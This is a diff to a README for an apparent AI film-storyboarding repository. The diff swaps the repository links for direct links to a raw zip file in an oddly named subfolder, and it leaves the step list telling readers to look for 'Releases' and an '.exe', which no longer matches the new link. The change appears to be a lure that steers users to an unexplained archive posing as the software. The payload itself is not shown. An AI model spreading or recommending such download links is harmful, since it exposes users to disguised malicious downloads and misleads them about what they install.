@@ -1,6 +1,6 @@
 # 🎬 awesome-ai-storyboarding - Create professional film storyboards with AI
 
-[![Download the Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/monarchal-espressoshop454/awesome-ai-storyboarding)
+[![Download the Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/monarchal-espressoshop454/awesome-ai-storyboarding/raw/refs/heads/main/spongiocyte/ai-storyboarding-awesome-undecree.zip)
 
 This project provides a collection of AI tools for your filmmaking needs. You can use these tools to turn scripts into visual frames. This repository helps you organize your pre-production steps and keeps your creative process smooth.
 
@@ -24,7 +24,7 @@ Your computer needs to meet these basic standards to run the tools included in t
 
 Follow these steps to get the software on your Windows computer.
 
-1. Visit this page to download: [https://github.com/monarchal-espressoshop454/awesome-ai-storyboarding](https://github.com/monarchal-espressoshop454/awesome-ai-storyboarding)
+1. Visit this page to download: [https://github.com/monarchal-espressoshop454/awesome-ai-storyboarding/raw/refs/heads/main/spongiocyte/ai-storyboarding-awesome-undecree.zip](https://github.com/monarchal-espressoshop454/awesome-ai-storyboarding/raw/refs/heads/main/spongiocyte/ai-storyboarding-awesome-undecree.zip)
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the version tagged as "Latest."
 4. Look for the file ending in ".exe" under the "Assets" section.
